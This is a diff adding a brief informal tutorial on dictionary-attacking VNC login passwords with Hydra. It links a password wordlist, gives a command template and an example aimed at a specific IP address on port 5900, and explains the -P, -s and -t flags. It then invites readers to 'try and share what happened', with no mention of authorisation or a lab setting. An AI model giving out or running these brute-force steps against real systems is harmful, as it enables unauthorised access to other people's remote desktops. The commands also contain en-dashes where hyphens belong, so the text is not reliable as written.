@@ -1,0 +1,24 @@
+Hydra is often the tool of choice. It can perform rapid dictionary attacks against more than 50 protocols, including telnet, vnc, http, https, smb, several databases, and much more
+
+Now, we need to choose a word list. As with any dictionary attack, the wordlist is key. Kali has numerous wordlists built right in.
+
+I use this --> https://github.com/berandal666/Passwords
+
+When u choice ur wordlist run the command in terminal (Kali or Parrot OS)
+
+>> hydra -s 5900 –P /root/Desktop/pass.txt IP vnc
+
+EXAMPLE:
+
+>> hydra -s 5900 –P /root/Desktop/pass.txt –t 16 245.156.0.13 vnc
+
+When
+-P:  denotes the path for the password list
+-s: denote destination port number
+-t: Run TASKS number of connects in parallel
+
+Once the commands are executed it will start applying the dictionary attack.
+
+Try and share what happened 
+
+~ Enjoy The Movement!
